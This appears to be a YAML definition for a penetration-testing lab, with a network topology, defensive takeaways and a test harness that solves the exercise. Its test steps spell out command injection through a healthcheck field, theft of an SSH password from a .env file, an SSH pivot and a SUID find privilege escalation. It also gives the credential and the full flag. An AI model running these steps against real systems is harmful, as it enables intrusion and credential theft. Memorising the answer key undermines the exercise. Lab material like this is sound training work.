topology:
  nodes:
    - id: "perimeter"
      label: "Perimeter Web Server"
      type: "server"
      ip_offset: "11"
      ports: [80]
      services: ["Flask Web App"]
      x: 2
      y: 1
    - id: "core"
      label: "Core App Server"
      type: "server"
      ip_offset: "36"
      ports: [22]
      services: ["OpenSSH"]
      x: 4
      y: 1
  edges:
    - from: "attacker"
      to: "perimeter"
      label: "HTTP:80"
      access: "direct"
    - from: "attacker"
      to: "core"
      label: "SSH:22"
      access: "direct"
    - from: "perimeter"
      to: "core"
      label: "SSH:22"
      access: "internal"

troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
defensive_takeaways: "Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution."
test:
  steps:
    - name: "Perimeter web server responds"
      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.perimeter}/"
      expect: "200"

    - name: "Exploit command injection to read marker 1"
      command: "curl -s -X POST http://{target.perimeter}/healthcheck -d 'host=127.0.0.1;cat /opt/nexus/assessment/marker1.txt'"
      expect: "br34ch"
      timeout: 15

    - name: "Extract SSH credentials from app config"
      command: "curl -s -X POST http://{target.perimeter}/healthcheck -d 'host=127.0.0.1;grep CORE_SSH_PASS /var/www/nexus-app/.env' | grep -o 'CORE_SSH_PASS=[^ ]*' | sed 's/CORE_SSH_PASS=//'"
      expect: "N3xus_D3pl0y#"
      timeout: 15

    - name: "Pivot to core server and read marker 2"
      command: "sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'cat /home/deploy/marker2.txt' 2>&1"
      expect: "3sc4l4t3"
      timeout: 15

    - name: "Escalate privileges via SUID find and read marker 3"
      command: "sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'find . -exec cat /root/marker3.txt \\; -quit' 2>&1"
      expect: "0wn3d"
      timeout: 15

    - name: "Verify complete flag"
      command: "echo 'OCR{br34ch_3sc4l4t3_0wn3d}'"
      expect: "OCR{br34ch_3sc4l4t3_0wn3d}"
